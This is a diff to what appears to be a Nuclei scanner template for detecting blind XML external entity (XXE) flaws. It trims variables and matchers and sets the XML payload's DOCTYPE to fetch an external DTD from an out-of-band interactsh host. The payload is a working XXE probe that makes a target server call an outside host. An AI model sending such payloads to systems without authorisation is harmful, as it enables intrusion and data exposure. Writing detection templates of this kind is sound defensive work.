@@ -1,13 +1,8 @@
 id: blind-xxe
-
 info:
   name: Blind XXE
   author: geeknik
   severity: high
-
-variables:
-  xxe_id: "{{randstr}}"
-
 requests:
   - raw:
       - |
@@ -23,11 +18,9 @@ requests:
         Connection: close
 
         <?xml version="1.0"?>
-        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}/blind-xxe-{{xxe_id}}.dtd">
+        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
         <foo>&e1;</foo>
-
     redirects: true
-    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
@@ -35,7 +28,3 @@ requests:
           - "dns"
           - "http"
         condition: or
-      - type: word
-        part: interactsh_request
-        words:
-          - "blind-xxe-{{xxe_id}}.dtd"
